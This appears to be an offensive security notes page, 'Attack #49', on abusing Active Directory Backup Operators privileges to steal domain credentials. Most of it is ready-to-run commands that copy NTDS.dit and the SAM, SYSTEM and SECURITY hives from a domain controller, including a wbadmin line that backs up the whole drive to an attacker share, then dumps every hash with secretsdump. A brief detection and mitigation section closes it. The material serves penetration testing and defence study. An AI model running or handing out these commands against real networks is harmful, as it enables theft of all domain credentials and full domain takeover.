---
title: "Attack #49 — Abusing Backup Operators Group"
description: "Members of Backup Operators have the SeBackupPrivilege and SeRestorePrivilege, which grants them the ability to read and write any file on the system —…"
category: active-directory
tags: ["active-directory", "privilege-escalation", "hashing"]
tools: ["Impacket", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Six/🟣 Attack #49 — Abusing Backup Operators Group.md"
---
# 🟣 Attack #49 — Abusing Backup Operators Group

***

## 📖 How It Works

Members of **Backup Operators** have the `SeBackupPrivilege` and `SeRestorePrivilege`, which grants them the ability to **read and write any file on the system** — bypassing NTFS ACLs entirely. This means a Backup Operator can copy the NTDS.dit database and SYSTEM hive from a DC, extract all domain hashes offline, and achieve full domain compromise.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Membership in Backup Operators** | Provides SeBackupPrivilege + SeRestorePrivilege |
| **Logon access to DC** | RDP or WinRM (Backup Operators can log on locally by default) |

***

## 💻 Full Commands

```powershell
# ── Verify privileges ─────────────────────────────────────────────────────────
whoami /priv
# SeBackupPrivilege  = Read any file
# SeRestorePrivilege = Write any file

# ── Method 1: robocopy backup mode ───────────────────────────────────────────
robocopy /B C:\Windows\NTDS C:\Temp ntds.dit
reg save HKLM\SYSTEM C:\Temp\SYSTEM

# ── Method 2: diskshadow + robocopy ──────────────────────────────────────────
# Create diskshadow script:
echo "set context persistent nowriters" > script.txt
echo "add volume C: alias mydrive" >> script.txt
echo "create" >> script.txt
echo "expose %mydrive% Z:" >> script.txt

diskshadow /s script.txt
robocopy /B Z:\Windows\NTDS C:\Temp ntds.dit

# ── Method 3: wbadmin (Windows Server Backup) ────────────────────────────────
wbadmin start backup -backuptarget:\\ATTACKER\share -include:C: -quiet
# Then extract NTDS.dit from backup

# ── Parse offline ─────────────────────────────────────────────────────────────
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -outputfile backup_op_dump
```

```bash
# ── Remote via reg.py (SeBackupPrivilege) ─────────────────────────────────────
reg.py corp.local/backup_user:'Password1'@DC01.corp.local save -keyName 'HKLM\SAM' -o SAM
reg.py corp.local/backup_user:'Password1'@DC01.corp.local save -keyName 'HKLM\SYSTEM' -o SYSTEM
reg.py corp.local/backup_user:'Password1'@DC01.corp.local save -keyName 'HKLM\SECURITY' -o SECURITY
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4672** | Security Log | SeBackupPrivilege/SeRestorePrivilege assigned at logon |
| **4663** | Security Log | Object access — NTDS.dit file read |
| **8222** | Security Log | Shadow copy created |

***

## 🔗 Attack Chain Context

```
[Backup Operators] ──→ SeBackupPrivilege → read NTDS.dit → all domain hashes
         │
         ├──→ 🔗 Bypass NTFS ACLs → copy any file including NTDS.dit
         ├──→ 🔗 Offline parsing → no DCSync needed
         └──→ 💀 Defeated by: limit Backup Operators membership, monitor privilege use
```

***

> ✅ **Attack #49 — Backup Operators complete.**
